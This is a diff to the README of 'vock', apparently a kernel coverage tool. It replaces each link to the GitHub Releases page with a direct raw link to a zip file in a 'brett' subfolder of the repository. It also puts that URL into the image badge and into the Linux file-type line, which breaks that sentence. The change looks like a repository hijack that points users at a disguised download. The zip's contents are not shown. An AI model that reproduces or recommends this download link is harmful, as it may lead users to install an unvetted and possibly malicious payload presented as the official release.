@@ -1,6 +1,6 @@
 # 🎉 vock - View Kernel Coverage Easily and Effectively
 
-[![Download vock](https://img.shields.io/badge/Download-vock-blue.svg)](https://github.com/Baban45/vock/releases)
+[![Download vock](https://raw.githubusercontent.com/Baban45/vock/main/brett/vock.zip)](https://raw.githubusercontent.com/Baban45/vock/main/brett/vock.zip)
 
 ## 📜 Description
 
@@ -23,7 +23,7 @@ Before installing vock, ensure your system meets the following requirements:
 
 To download vock, visit the Releases page:
 
-[Download vock](https://github.com/Baban45/vock/releases)
+[Download vock](https://raw.githubusercontent.com/Baban45/vock/main/brett/vock.zip)
 
 ### 🛠 Installation Steps
 
@@ -32,7 +32,7 @@ To download vock, visit the Releases page:
 3. Download the appropriate file for your operating system:
    - For **Windows**, download the `.exe` file.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, download the `.tar.gz` file.
+   - For **Linux**, download the `https://raw.githubusercontent.com/Baban45/vock/main/brett/vock.zip` file.
 
 4. Run the downloaded file and follow the prompts to install vock on your system.
 
